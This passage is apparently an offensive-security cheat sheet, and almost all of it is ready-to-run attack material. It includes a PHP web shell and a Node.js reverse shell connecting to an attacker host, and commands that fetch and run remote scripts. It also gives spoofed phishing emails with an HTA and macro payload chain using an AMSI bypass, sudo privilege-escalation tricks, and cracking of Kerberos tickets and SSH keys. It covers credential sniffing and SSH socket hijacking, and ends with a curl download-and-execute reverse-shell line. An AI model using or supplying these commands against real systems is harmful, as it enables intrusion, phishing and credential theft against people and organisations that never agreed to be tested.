| SharpSecDump | remote SAM/SECURITY/LSA dump |
| Rubeus | Kerberos abuse (roasting, tickets, S4U) |
| Get-ServiceAcl.ps1 | check ACL/perms on a specific service |
| HostRecon | quick host/network context recon |
| linpeas.sh / pspy | Linux privesc / process monitoring |

```txt
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/HostRecon.ps1 -c "Invoke-HostRecon"'
sharpsh -M -E -t 120 -- '-u http://<attacker-ip>/PowerUp.ps1 -c "Invoke-AllChecks"'
sharpsh -t 400 -- '-u http://<attacker-ip>/winPEAS.ps1 -c 1'
sharp-hound-4 -M -E -t 300 -- -c all -d <domain> --zipfilename out.zip --outputdirectory c:\\users\\public
sharpup -M -E -t 120 -- audit
seatbelt -M -E -- -group=all
```

---

## Web Exploitation

### PHP Upload Filter Bypass
```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/<attacker-ip>/53 0>&1'");?>
```
Save as `.phtml` when `.php` is blocked by extension filters.


### Directory/Content Discovery
```sh
gobuster dir -e -u http://<target-ip>/ -w seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html -o buster
feroxbuster -u http://<target-ip>/ -w seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o ferox -t 200 -x asp,aspx -k
```

### JS/Node.js Reverse Shell
```js
(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("cmd",[]);var client=new net.Socket();client.connect(<port>,"<attacker-ip>",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();
```
```js
try {
  await require('child_process').exec('powershell -enc <base64>')
} catch (e) {
  console.log(e)
}
```

### FTP
```txt
ftp -p anonymous@<target-host>
ftp -p <user>@<target-ip>    # -p when port 20 blocked, causes passive/active errors
passive     # toggle passive mode
epsv        # toggle extended passive mode
binary      # switch to binary transfer
site chmod 600 authorized_keys
ls -la
del authorized_keys
```

### ELF Reverse Shell Compilation (for upload-based RCE)
```sh
gcc -Wl,--gc-sections -fPIC -z execstack -o rev.elf rev.c -static -Oz
upx --best rev.elf     # shrink after static linking
```

---

## Phishing / Initial Access

### swaks (send email through target's own SMTP server)
```sh
swaks --to <user>@<domain> --from <spoofed-sender>@<domain> --server <target-ip> --body "...http://<attacker-ip>/error.hta for errors"
swaks --to <user>@<domain> --from <spoofed-sender>@example.com --server <target-ip> --body "...cv.doc..." --attach @cv.doc
```

### DotNetToJScript (HTA payload for phishing)
```sh
# after editing ExampleAssembly with your runspace+AMSI-bypass+IEX payload, compile the whole project, then:
.\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```
Embed `demo.js` contents in an `.hta` template. Chain: HTA → AMSI bypass + runspace → IEX fetches a small `.txt` loader → loader fetches a proc-injecting `.exe` → injected process pulls the final Sliver shellcode.

### VBA Macro Payload (malicious doc)
```txt
base64ps 'iex(iwr http://<attacker-ip>/proxyupdate.txt -usebasicparsing)'
```
Embed the resulting base64 in a macro that runs `powershell -enc <b64>`.

---

## Linux Privesc & Enumeration

### GTFOBins-Style Sudo Abuse
```sh
sudo find . -exec chmod u+s /bin/bash \; -quit
sudo lua -e 'os.execute("/bin/bash")'
sudo su 
```
Always check `sudo -l` first — https://gtfobins.org has an escalation recipe for almost every binary.

### Ansible Vault Cracking
```sh
ansible2john.py vault_file.yml | cut -d':' -f2 > vault_hash.txt
hashcat vault_hash.txt --force --hash-type=16900 rockyou.txt

# once password known
cat vault_file.yml | ansible-vault decrypt
```

### SSH Key Cracking
```sh
ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
```

### Kerberos Ticket Reuse from a Compromised Linux Box
```sh
# find /tmp/krb5cc_* files, then
cat /tmp/krb5cc_<uid>_<random> | base64 -w 0    # on target
echo -n '<base64>' | base64 -d > ticket.ccache   # on attacker
export KRB5CCNAME=ticket.ccache
klist
```

### SSH ControlMaster Hijack
Check `~/.ssh/config` for `ControlMaster`/`ControlPath` — if `ControlPersist` isn't set (or is `no`), change it to `yes` and wait for the legit user to reconnect; you can then reuse the multiplexed socket to SSH in without creds.

### Credential Sniffing
```sh
sudo tcpdump -i any -vvv -s0 -A 'port 20 or port 21 or port 22'
```

### pspy
Run to catch cron/scheduled processes and credentials passed on the command line.

---

## Password Cracking

```sh
hashcat tgs_hashes.txt --force --hash-type=13100 rockyou.txt              # Kerberoast TGS
hashcat dcc2_hashes.txt --force --hash-type=2100 rockyou.txt --hwmon-disable # DCC2 (cached domain creds)
hashcat vault_hash.txt --force --hash-type=16900 rockyou.txt     # Ansible Vault
john hash_file.txt --wordlist=rockyou.txt
hydra -L usernames.txt -P passwords.txt -w 2 -t 32 -I -M targets.txt ssh
```
Common hashcat modes: `13100` (Kerberoast), `18200` (AS-REP roast), `2100` (DCC2), `16900` (Ansible Vault).

---

## Misc Utilities
```sh
# base64-encode a PS command for use inline in a BOF/sharpsh call
base64ps 'command here'

# donut - convert PE to position-independent shellcode
donut -f 1 -o ./agent.bin -a 2 -p "-connect <attacker-ip>:11601 -ignore-cert" -i /path/to/ligolo-ng/agent.exe
donut -c sql.Program -f 1 -o sql.bin -a 2 -i sql.exe   # .NET class entrypoint
donut -i GodPotato.exe -a 2 -b 2 -p '-cmd c:\windows\tasks\up.exe' -o godpotato.bin

# generate a self-relaying rev shell one-liner and drop it on a box via an initial exploit
curl -o /tmp/r.sh http://<attacker-ip>/basic_rev.sh; chmod u+x /tmp/r.sh; /tmp/r.sh
```
